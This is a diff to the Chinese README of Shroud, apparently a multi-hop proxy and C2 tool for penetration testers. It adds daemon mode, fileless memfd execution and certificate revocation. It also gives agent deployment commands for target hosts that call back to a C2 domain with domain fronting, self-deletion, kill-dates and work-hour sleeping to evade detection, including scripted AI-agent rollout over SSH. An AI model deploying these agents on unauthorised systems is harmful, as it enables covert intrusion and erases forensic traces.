@@ -20,7 +20,7 @@ Shroud是一个利用go语言编写、专为渗透测试工作者制作的多级
                                     │   │  │Topology│ │ Identity Store │   │  │
                                     │   │  │Manager │ │(Argon2id+GCM)  │   │  │
                                     │   │  └────────┘ └────────────────┘   │  │
-                                    │   │  Interactive CLI / Script Mode   │  │
+                                    │   │  Daemon / CLI / Script Mode      │  │
                                     │   │  SOCKS5 Listener / Port Forward  │  │
                                     │   └──────────────┬───────────────────┘  │
                                     └──────────────────┼──────────────────────┘
@@ -146,6 +146,9 @@ Shroud是一个利用go语言编写、专为渗透测试工作者制作的多级
   │                           │ 成功    │
   │                           └─────────┘
   │
+  │  --fileless (仅Linux)
+  │  └─ 身份存memfd，磁盘零写入
+  │
   │  --work-hours 09:00-18:00
   │  └─ 窗口外 → 休眠至下一工作开始
   │
@@ -164,11 +167,13 @@ Shroud是一个利用go语言编写、专为渗透测试工作者制作的多级
 **基础功能**
 
 - 交互式CLI(`admin`)：Tab命令补全、方向键历史导航、多层级面板切换
+- Daemon服务模式(`--daemon`)：Admin以无头服务运行，支持systemd托管，断线自动重连（指数退避+crypto/rand抖动），SIGTERM优雅退出
+- Admin断线重连(自动)：主动模式下连接断开后自动尝试重连，交互模式10次/daemon模式10000次，指数退避上限5分钟
 - 节点拓扑管理(`topo`)：树状展示所有在线节点的父子关系
 - 节点信息展示(`detail`)：显示每个节点的IP、主机名、用户名、备忘
 - 正向连接(`connect`)：Admin指令当前节点主动连接子节点
 - 反向连接(`listen`)：Admin指令当前节点监听端口，等待子节点连入
-- 自动重连(`--reconnect <秒>`)：断线后按指数退避+随机抖动自动重连，上限5分钟
+- Agent自动重连(`--reconnect <秒>`)：断线后按指数退避+随机抖动自动重连，上限5分钟
 - 代理出网(`--socks5-proxy`/`--http-proxy`)：节点间可通过SOCKS5或HTTP代理连接
 - SSH隧道接入(`sshtunnel`)：通过已有SSH权限将节点加入网络，流量伪装为SSH
 - 传输协议选择(`--up`/`--down`)：节点间流量支持裸TCP(`raw`)和WebSocket(`ws`)两种协议
@@ -179,6 +184,7 @@ Shroud是一个利用go语言编写、专为渗透测试工作者制作的多级
 - 端口映射(`forward`/`backward`)：正向映射Admin本地端口到远程，反向映射Agent端口到Admin本地
 - 端口复用(`--rehost`/`--report`)：SO_REUSEPORT模式(Windows/macOS/Linux)与IPTABLES模式(Linux，需root)
 - 服务管理(`stopsocks`/`stopforward`/`stopbackward`)：随时启停各类代理/映射服务
+- 证书吊销(`revoke`)：Admin吊销指定节点证书，断开并阻止其重连
 - 多平台编译(`make all`)：Linux/macOS/Windows/MIPS/ARM/FreeBSD共9个平台，CGO_ENABLED=0静态编译
 - 节点下线(`shutdown`)：Admin远程终止指定节点
 
@@ -216,7 +222,8 @@ Shroud是一个利用go语言编写、专为渗透测试工作者制作的多级
 - 休眠内存加密(`--sleep-mask`)：重连等待期间用临时密钥加密密钥材料，零化原始值
 - KillDate自毁(`--kill-date <YYYY-MM-DD>`)：到期自动清除密钥、删除身份文件并退出，每60秒检查
 - 工作时间窗口(`--work-hours <HH:MM-HH:MM>`)：窗口外自动休眠，零流量零连接
-- Agent自删除(`--self-delete`)：退出时用随机数据覆写并删除自身二进制(Windows使用延迟删除)
+- Agent无文件执行(`--fileless`，仅Linux)：身份仅存内存(memfd_create)，不写入磁盘；配合`--self-delete`实现零磁盘痕迹；重启需重新注册
+- Agent自删除(`--self-delete`)：退出时用随机数据覆写并删除自身二进制和身份文件(Windows使用延迟删除)
 - 二进制混淆(`make obfuscated`)：garble编译，`-literals -tiny -seed=random`混淆字符串和符号
 
 ## 编译及使用
@@ -274,6 +281,7 @@ Shroud一共包含两种角色，分别是：
 -l 被动模式下的监听地址[ip]:<port>
 -s 一次性注册引导口令(必填，用于首次签发节点证书；已注册节点后续使用证书认证)
 -c 主动模式下的目标节点地址
+--daemon 以无头服务模式运行(无交互终端，断线自动重连，适合systemd托管)
 --socks5-proxy socks5代理服务器地址
 --socks5-proxyu socks5代理服务器用户名(可选)
 --socks5-proxyp socks5代理服务器密码(可选)
@@ -286,6 +294,7 @@ Shroud一共包含两种角色，分别是：
 --tor-proxy Tor SOCKS5代理地址，如 127.0.0.1:9050
 --passphrase 身份文件加密口令(可选，也可通过SHROUD_PASSPHRASE环境变量设置)
 --identity-dir 身份文件存储目录(可选，默认从密钥派生)
+--identity-plain 允许身份文件明文存储(不推荐，默认要求加密)
 --ca-file 离线CA密钥文件路径(可选，用于证书签发)
 --pad-size 流量填充块大小(可选，如4096，需admin和agent一致)
 ```
@@ -322,6 +331,8 @@ Shroud一共包含两种角色，分别是：
 --kill-date 自毁日期(格式: 2026-07-01，到期自动清理退出)
 --work-hours 工作时间窗口(格式: 09:00-18:00，窗口外自动休眠)
 --self-delete 退出时安全删除自身二进制和身份文件
+--fileless 无文件模式(仅Linux)，身份仅存内存，不写入磁盘；重启需重新注册
+--identity-plain 允许身份文件明文存储(不推荐)
 --user-agent 自定义User-Agent(多个以|分隔，每次请求随机选择)
 --front-domain 域前置Host头(WebSocket模式下伪装为指定域名)
 --origin 自定义Origin头(WebSocket模式下替换默认值)
@@ -730,24 +741,88 @@ python reuse.py --start --rhost <agent_ip> --rport 22
 ./shroud_admin -c <agent_ip>:22 -s mysecret
 ```
 
-### 场景十：完整OPSEC部署
+### 场景十：systemd服务化部署（推荐）
 
-综合所有隐蔽特性：WS+TLS、域前置、流量填充、心跳抖动、KillDate、工作时间、自删除、休眠加密。
+Admin以`--daemon`模式运行，由systemd托管，断线自动重连，SIGTERM优雅退出。**生产环境推荐此方式部署Admin**。
+
+```
+Operator VPS                          
+┌──────────────────────────────┐     
+│  systemd                     │     
+│  └─ shroud-admin --daemon    │     
+│     ├─ 断线自动重连(10000次) │     
+│     ├─ SIGTERM优雅退出       │     
+│     └─ 密钥擦除后退出        │     
+└──────────────────────────────┘     
+```
+
+**第一步：创建环境文件**
 
 ```bash
-# Operator (Admin端)
-./shroud_admin -l 443 -s <secret> \
+sudo mkdir -p /etc/shroud /var/lib/shroud
+# 生成强随机口令
+sudo bash -c 'cat > /etc/shroud/admin.env << EOF
+SHROUD_SECRET=$(openssl rand -base64 24)
+SHROUD_PASSPHRASE=$(openssl rand -base64 24)
+EOF'
+sudo chmod 600 /etc/shroud/admin.env
+```
+
+**第二步：部署二进制和服务文件**
+
+```bash
+sudo cp shroud_admin /opt/shroud/shroud_admin
+sudo chmod 755 /opt/shroud/shroud_admin
+
+# 项目自带服务文件模板
+sudo cp deploy/shroud-admin.service /etc/systemd/system/
+# 按需编辑 ExecStart 行，调整连接参数
+sudo systemctl daemon-reload
+```
+
+**第三步：启动服务**
+
+```bash
+sudo systemctl enable --now shroud-admin
+sudo systemctl status shroud-admin
+# 查看日志
+journalctl -u shroud-admin -f
+```
+
+**第四步：交互式管理（可选）**
+
+daemon模式下Admin无交互终端。需要执行命令时，可另起一个交互式Admin连接同一Agent：
+
+```bash
+# 临时交互式会话（与daemon共存，连接同一Agent）
+./shroud_admin -c <agent_ip>:<port> -s <same_secret> --passphrase <same_pass>
+```
+
+或使用`--script`模式：
+
+```bash
+echo -e "use 0\nsocks 7777" | ./shroud_admin -c <agent_ip>:<port> \
+  -s <same_secret> --passphrase <same_pass> --script
+```
+
+### 场景十一：完整OPSEC部署
+
+综合所有隐蔽特性：Admin daemon服务化、WS+TLS、域前置、流量填充、心跳抖动、KillDate、无文件执行、自删除、休眠加密。
+
+```bash
+# Operator (Admin端 - systemd daemon服务)
+./shroud_admin --daemon -l 443 -s <secret> \
   --down ws --tls-enable --heartbeat \
   --passphrase <pass> --pad-size 4096
 
-# Target (Agent端 - 最大隐蔽性)
+# Target (Agent端 - 最大隐蔽性 + 无文件执行)
 ./shroud_agent -c <c2_domain>:443 -s <secret> \
   --up ws --tls-enable \
   --reconnect 30 \
   --front-domain cdn.example.com \
   --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)|Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" \
   --passphrase <pass> --pad-size 4096 \
-  --sleep-mask --self-delete \
+  --sleep-mask --self-delete --fileless \
   --kill-date 2026-07-15 \
   --work-hours 09:00-18:00
 ```
@@ -756,18 +831,20 @@ python reuse.py --start --rhost <agent_ip> --rport 22
 
 | 参数 | 作用 |
 |------|------|
+| `--daemon` | Admin无头服务模式，断线自动重连 |
 | `--up ws --tls-enable` | WebSocket + TLS，流量形似HTTPS |
 | `--front-domain` | Host头伪装为CDN域名 |
 | `--user-agent` | 每次请求随机UA |
 | `--pad-size 4096` | 帧填充至4KB倍数，防流量大小分析 |
 | `--reconnect 30` | 断线后30秒基础间隔重连（自动指数退避+抖动） |
 | `--sleep-mask` | 重连等待期间加密内存中的密钥 |
+| `--fileless` | 身份仅存内存，磁盘零痕迹(仅Linux) |
 | `--self-delete` | 退出时覆写并删除自身二进制 |
 | `--kill-date` | 到期自动清除痕迹并退出 |
 | `--work-hours` | 仅工作时间活动，非窗口期零流量 |
-| `--passphrase` | 身份文件落盘加密 |
+| `--passphrase` | 身份文件落盘加密（非fileless模式时） |
 
-### 场景十一：CDN保护Admin真实IP
+### 场景十二：CDN保护Admin真实IP
 
 将Admin隐藏在CDN（如Cloudflare）后面，Agent只知道CDN域名，永远无法获取Admin的真实IP。即使Agent被攻陷，攻击者也无法定位Operator工作站。
 
@@ -844,7 +921,10 @@ iptables -A INPUT -p tcp --dport 443 -j DROP
 
 ## 自动化部署
 
-Shroud的Admin支持`--script`模式，从stdin读取命令而非交互式终端，适合脚本化和AI Agent自动化部署。
+Shroud的Admin支持三种运行模式：
+- `--daemon`模式（推荐）：无头服务运行，systemd托管，断线自动重连，适合长期部署
+- `--script`模式：从stdin读取命令，适合一次性脚本化操作
+- 交互模式（默认）：手动操作控制台
 
 ### 拓扑描述格式
 
@@ -905,8 +985,8 @@ AI Agent或部署脚本按以下顺序执行：
     scp shroud_agent_<platform> <ssh_user>@<host>:/tmp/shroud_agent
 
 步骤3: 启动Admin
-  ./shroud_admin -l <listen_port> -s <secret> [options] --script < commands.txt
-  # 或不使用 --script，手动/AI操作交互式控制台
+  ./shroud_admin -l <listen_port> -s <secret> [options] --daemon
+  # 或使用 --script 管道输入命令，或不加参数进入交互模式
 
 步骤4: 启动第一个Agent (connect_to: admin)
   ssh <agent-0> "/tmp/shroud_agent -c <admin_host>:<port> -s <secret> [options] &"
@@ -1033,6 +1113,7 @@ Node[1]'s children ->
   stopbackward                                    Shut down backward services
   transport  <tor|raw>                            Switch transport mode (tor=Tor anonymity, raw=direct TCP)
   newcircuit                                      Request a new Tor circuit for current node
+  revoke                                          Revoke current node's certificate and disconnect
   shutdown                                        Terminate current node
   back                                            Back to parent panel
   exit                                            Exit Shroud 
@@ -1368,6 +1449,14 @@ $
 [*] Requesting new Tor circuit......
 [*] New circuit established!
 (node 0) >>
+```
+
+- `revoke`: 吊销当前节点的证书并断开连接。被吊销的节点无法重连，需重新注册
+
+```
+(node 1) >> revoke
+[*] Certificate revoked for node 1
+[*] Node 1 disconnected
 ```
 
 - `shutdown`: 命令当前节点下线
